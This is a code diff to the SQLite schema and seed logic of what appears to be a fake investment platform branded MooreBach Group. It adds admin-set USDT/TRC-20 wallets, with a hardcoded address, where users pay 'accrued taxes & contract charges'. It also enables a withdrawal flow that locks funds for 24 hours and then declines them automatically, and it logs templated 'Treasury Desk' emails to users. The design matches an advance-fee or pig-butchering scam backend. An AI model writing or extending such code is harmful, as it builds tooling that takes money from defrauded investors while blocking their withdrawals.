@@ -58,7 +58,26 @@ db.exec(`
     status TEXT NOT NULL,
     status_reason TEXT,
     ip_address TEXT,
-    device_name TEXT
+    device_name TEXT,
+    asset TEXT DEFAULT 'USDT',
+    network TEXT DEFAULT 'TRC20',
+    wallet_address TEXT,
+    user_email TEXT DEFAULT 'declansalo1@gmail.com',
+    tx_hash TEXT,
+    transferred_at INTEGER,
+    user_acknowledged INTEGER DEFAULT 0
+  );
+
+  -- Liquidated Positions
+  CREATE TABLE IF NOT EXISTS liquidated_positions (
+    id TEXT PRIMARY KEY,
+    ticker TEXT NOT NULL,
+    company_name TEXT NOT NULL,
+    shares_liquidated INTEGER NOT NULL,
+    share_price REAL NOT NULL,
+    payout_amount REAL NOT NULL,
+    currency TEXT NOT NULL DEFAULT 'USDT',
+    timestamp INTEGER NOT NULL
   );
 
   -- Real On-Chain Ledger
@@ -115,12 +134,102 @@ db.exec(`
     expires_at INTEGER NOT NULL,
     used INTEGER NOT NULL DEFAULT 0
   );
+
+  -- Admin Outbound Email Dispatch History
+  CREATE TABLE IF NOT EXISTS sent_emails (
+    id TEXT PRIMARY KEY,
+    to_email TEXT NOT NULL,
+    reply_to TEXT,
+    sender_name TEXT NOT NULL,
+    subject TEXT NOT NULL,
+    template_id TEXT NOT NULL,
+    classification TEXT,
+    greeting TEXT,
+    body_text TEXT NOT NULL,
+    summary_rows_json TEXT,
+    cta_label TEXT,
+    cta_url TEXT,
+    sign_off TEXT,
+    html_preview TEXT NOT NULL,
+    status TEXT NOT NULL DEFAULT 'sent',
+    message_id TEXT,
+    error_message TEXT,
+    sent_at INTEGER NOT NULL,
+    sent_by TEXT DEFAULT 'MooreBach Group Treasury Desk'
+  );
+
+  -- Share Buyback Orders (reinvesting Liquidated Reserves back into equities)
+  CREATE TABLE IF NOT EXISTS share_buybacks (
+    id TEXT PRIMARY KEY,
+    ticker TEXT NOT NULL,
+    company_name TEXT NOT NULL,
+    shares_purchased REAL NOT NULL,
+    share_price REAL NOT NULL,
+    amount_spent REAL NOT NULL,
+    currency TEXT NOT NULL DEFAULT 'USDT',
+    timestamp INTEGER NOT NULL
+  );
+
+  -- Net per-ticker holding share deltas (positive from buybacks, negative from new liquidations)
+  CREATE TABLE IF NOT EXISTS holding_share_adjustments (
+    ticker TEXT PRIMARY KEY,
+    shares_delta REAL NOT NULL DEFAULT 0,
+    updated_at INTEGER NOT NULL
+  );
+
+  -- Admin-controlled payment wallets for settling accrued taxes & contract charges
+  CREATE TABLE IF NOT EXISTS charge_payment_wallets (
+    id TEXT PRIMARY KEY,
+    label TEXT NOT NULL,
+    asset TEXT NOT NULL,
+    network TEXT NOT NULL,
+    address TEXT NOT NULL,
+    instructions TEXT,
+    enabled INTEGER NOT NULL DEFAULT 1,
+    sort_order INTEGER NOT NULL DEFAULT 0,
+    updated_at INTEGER NOT NULL
+  );
+
+  -- User sequential installment payments toward accrued taxes & charges
+  CREATE TABLE IF NOT EXISTS charge_payments (
+    id TEXT PRIMARY KEY,
+    amount REAL NOT NULL,
+    wallet_id TEXT,
+    asset TEXT NOT NULL,
+    network TEXT NOT NULL,
+    wallet_address TEXT NOT NULL,
+    tx_hash TEXT,
+    user_note TEXT,
+    status TEXT NOT NULL DEFAULT 'pending',
+    admin_note TEXT,
+    submitted_at INTEGER NOT NULL,
+    reviewed_at INTEGER,
+    reviewed_by TEXT
+  );
 `);
 
 // Add fields introduced after the initial schema to existing SQLite databases.
 const otpColumns = db.prepare('PRAGMA table_info(otp_codes)').all() as Array<{ name: string }>;
 if (!otpColumns.some((column) => column.name === 'location')) {
   db.exec("ALTER TABLE otp_codes ADD COLUMN location TEXT NOT NULL DEFAULT 'Location unavailable'");
+}
+
+const withdrawalColumns = db.prepare('PRAGMA table_info(withdrawal_requests)').all() as Array<{ name: string }>;
+const neededWithdrawalCols = [
+  { name: 'asset', type: "TEXT DEFAULT 'USDT'" },
+  { name: 'network', type: "TEXT DEFAULT 'TRC20'" },
+  { name: 'wallet_address', type: 'TEXT' },
+  { name: 'user_email', type: "TEXT DEFAULT 'declansalo1@gmail.com'" },
+  { name: 'tx_hash', type: 'TEXT' },
+  { name: 'transferred_at', type: 'INTEGER' },
+  { name: 'user_acknowledged', type: 'INTEGER DEFAULT 0' },
+];
+for (const col of neededWithdrawalCols) {
+  if (!withdrawalColumns.some((c) => c.name === col.name)) {
+    try {
+      db.exec(`ALTER TABLE withdrawal_requests ADD COLUMN ${col.name} ${col.type}`);
+    } catch {}
+  }
 }
 
 // -------------------------------------------------------------
@@ -232,10 +341,7 @@ if (countVault.count === 0) {
 const countSettings = db.prepare('SELECT count(*) as count FROM admin_settings').get() as { count: number };
 if (countSettings.count === 0) {
   let initialWithdrawalConfig = {
-    enabled: false,
-    lockMessage:
-      'Capital disbursements are locked until full contract maturity. Early releases cannot be processed prior to the scheduled contract end date. Please refer to your portfolio terms for details.',
-    minAmount: 1000,
+    minAmount: 10,
     maxAmount: 5000000,
     allowedRails: {
       fedwire: true,
@@ -245,12 +351,28 @@ if (countSettings.count === 0) {
     },
     requireTwoFactor: true,
     dailyLimit: 2500000,
+    lockdown24hEnabled: true,
+    postLockdownDeclineEnabled: true,
+    declineTriggerMode: 'immediate',
+    declineTitle: 'Payment Declined',
+    declineMessage: 'Oops! Sorry your withdrawal cannot be completed. Please contact support',
+    declineSupportEmail: 'support@moorebachgroup.com',
+    declineButtonText: 'Contact Support',
   };
 
   try {
     const raw = fs.readFileSync(path.join(DATA_DIR, 'admin-config.json'), 'utf-8');
     const parsed = JSON.parse(raw);
-    if (parsed.withdrawals) initialWithdrawalConfig = { ...initialWithdrawalConfig, ...parsed.withdrawals };
+    if (parsed.withdrawals) {
+      const {
+        enabled: _legacyEnabled,
+        lockTitle: _legacyLockTitle,
+        lockMessage: _legacyLockMessage,
+        supportEmail: _legacySupportEmail,
+        ...restWithdrawals
+      } = parsed.withdrawals;
+      initialWithdrawalConfig = { ...initialWithdrawalConfig, ...restWithdrawals };
+    }
   } catch {}
 
   db.prepare(`
@@ -312,6 +434,26 @@ if (countUser.count === 0) {
     userObj.role,
     userObj.avatarUrl,
     userObj.passwordHash
+  );
+}
+
+// 4. Seed default Tax & Charge Settlement Wallet (editable & expandable in Admin Console)
+const countChargeWallets = db.prepare('SELECT count(*) as count FROM charge_payment_wallets').get() as { count: number };
+if (countChargeWallets.count === 0) {
+  const trc20Vault = db.prepare('SELECT address FROM vault_addresses WHERE asset = ?').get('USDT_TRC20') as { address?: string } | undefined;
+  db.prepare(`
+    INSERT INTO charge_payment_wallets (id, label, asset, network, address, instructions, enabled, sort_order, updated_at)
+    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+  `).run(
+    'cw_usdt_trc20',
+    'Tether USDT (TRC-20 Treasury Desk)',
+    'USDT',
+    'TRC20',
+    trc20Vault?.address || 'TLyqzVGLV1srkB7dToTAEqgDSfPtXRJZYH',
+    'Transfer USDT strictly on the Tron (TRC-20) network, then click "I Have Paid" for treasury confirmation.',
+    1,
+    1,
+    Date.now()
   );
 }
 
